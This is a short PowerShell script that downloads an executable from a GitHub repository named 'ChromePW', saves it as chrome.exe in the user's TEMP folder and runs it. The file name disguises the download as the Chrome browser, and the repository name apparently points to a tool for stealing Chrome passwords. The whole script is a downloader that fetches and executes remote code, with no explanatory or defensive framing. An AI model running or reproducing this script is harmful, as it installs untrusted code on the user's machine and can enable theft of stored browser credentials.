$url = "https://github.com/h9839/ChromePW/raw/main/chrome.exe"
$outpath = "$env:TEMP/chrome.exe"
Invoke-WebRequest -Uri $url -OutFile $outpath
$chromeExecutablePath = Join-Path $env:TEMP "chrome.exe"
Start-Process -FilePath $chromeExecutablePath
